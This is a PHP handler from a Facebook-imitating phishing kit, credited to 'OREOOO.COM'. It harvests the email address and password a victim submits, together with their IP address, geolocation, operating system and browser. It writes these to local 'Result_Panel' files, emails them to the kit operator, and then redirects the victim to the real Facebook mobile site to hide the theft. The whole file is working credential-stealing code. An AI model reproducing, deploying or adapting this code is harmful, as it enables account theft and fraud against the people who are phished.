<?php
@session_start();
@error_reporting(0);
include("system.php"); 
$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	
$x = "_"; 
$xx = rand(99999999, 999999999999999999999); 
$xxx = md5(date('l jS \of F Y h:i:s A')); 
$xxxx = "="; 
$xxxxx = $details->geoplugin_countryCode; $xxxxxx = $details->geoplugin_countryName; $xxxxxxx = strtolower($xxxxx); 
$ip = $_SERVER['REMOTE_ADDR']; 
$details = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip."");

$email = $_SESSION['email'] = $_POST['email'];
$pass = $_SESSION['pass'] = $_POST['pass'] ;

$messege = '<html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{ background-color: #ededed;}p { display: block; -webkit-margin-before: 0.5em; -webkit-margin-after: 1em; -webkit-margin-start: 0px; -webkit-margin-end: 0px;}h1 { display: block; font-size: 3em; -webkit-margin-before: 0.67em; -webkit-margin-after: 0.67em; -webkit-margin-start: 1px; -webkit-margin-end: 1px; font-weight: bold;}#EYT {font-family: "Helvetica Neue Light","HelveticaNeue-Light","Helvetica Neue Light",Helvetica,Arial,sans-serif; font-size: 13px; color: #FFFFFF; text-decoration: none;}#div1 { border-radius: 8px; padding: 20px; text-align: center; background: linear-gradient(to right, #000099, #0000ff); padding: 20px; border: 1px solid #0000cc;}#div2 { background-color: ; margin: 25px;}h1, h2, h3, h4, h5, h6 { font-family: "Segoe UI",Arial,sans-serif; font-weight: 400; margin: 10px 0;}h3 { font-size: 24px;}*, *:before, *:after { box-sizing: inherit;}#a:link, #a:visited { color: white; text-shadow: 2px 2px 4px #000000;border-radius: 8px; -webkit-transition: width 2s, height 4s; background: linear-gradient(to right, #024282, #007fff); color: white;border-radius: 4px; padding: 10px 115px; text-align: center; text-decoration: none; display: inline-block;}#a:hover, #a:active { background: linear-gradient(to right, #000099, #0000ff); background-color: #359cff; padding: 10px 115px;}.w3-green, .w3-hover-green:hover { color: #fff!important; background-color: #d9dbdd!important;}</style>
</head><body style="background-color: #ededed;"><div class="center" style="border-radius: 4px; margin: auto; width: 60%; background: linear-gradient(to right, #000099, #0000ff); "><div id="div1" style="border-radius: 8px; padding: 20px; text-align: center; background: linear-gradient(to right, #000099, #0000ff); padding: 20px; border: 1px solid #0000cc;"> <h1 style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0; color: #ffffff; display: block; font-size: 3em; -webkit-margin-before: 0.67em; -webkit-margin-after: 0.67em; -webkit-margin-start: 1px; -webkit-margin-end: 1px; font-weight: 400" >&#70;&#97;&#99;&#101;&#32;&#82;&#101;&#115;&#117;&#108;&#116;
</h1></div><div id=""><div class="container w3-content w3-green" style="counter-reset: section; background: #d9dbdd; padding: 10px; font: 400 12px/1.8 " Lato", sans-serif; color: # a5a5a5; max-width: 980px; margin: auto; color: #fff important; background-color: #d9dbdd important;">
<style>.w3-light-grey,.w3-hover-light-grey:hover,.w3-light-gray,.w3-hover-light-gray:hover{color:#000!important;background-color:#f1f1f1!important}.w3-round-large{border-radius:8px}.w3-round-xlarge{border-radius:16px}.w3-round-xxlarge{border-radius:32px}</style>
<div class="w3-container" style="padding:0.01em 16px;"><div class="w3-panel w3-border w3-light-grey w3-round-large" style="padding:0.01em 16px;margin-top:16px;margin-bottom:16px"><h3 style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0; font-size: 24px; color:#505151">&#70;&#97;&#99;&#101;&#32;&#76;&#111;&#103;&#105;&#110;
</h3>
<HR>
	<h2 style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0;">Email  : '.$_SESSION["email"].' </h2>
	<h2 style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0;">Password : '.$_SESSION["pass"].' </h2>
<HR>
<h2 style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0;color: #500050">system : '.$OS.' </h2><h2 style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0;color: #500050">browser : '.$browserTy_Version.' </h2><h2 style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0;color: #500050">ip address : '.$_SERVER["REMOTE_ADDR"].' </h2><h2 style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0;color: #500050">date time : '.$InfoDATE.' </h2></div></div><div style="text-align: center;"></div></div></div><div id="div1" style="border-radius: 8px; padding: 20px; text-align: center; background: linear-gradient(to right, #000099, #0000ff); padding: 20px; border: 1px solid #0000cc;"><a href="http://oreooo.com" target="_blank" id="EYT" style="font-family: Helvetica Neue Light, HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; font-size: 13px; color: #FFFFFF; text-decoration: none;">
<strong>BY : OREOOO.COM</strong></a><a href="#" id="EYT" style="font-family: Helvetica Neue Light, HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; font-size: 13px; color: #FFFFFF; text-decoration: none;">
</a></div></div></body></html>';


include("../YOUR_EMAIL.php"); 
$f = fopen("../Result_Panel.php", "a");fwrite($f, $messege);
$ff = fopen("../../All_Result_Panel.php", "a");fwrite($ff, $messege);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Face Login [".$_SERVER['REMOTE_ADDR']."] ";
$headers .= "From: Login" . "\r\n";
mail($yourmail, $subject, $messege, $headers);
header("Location: https://m.facebook.com");
?>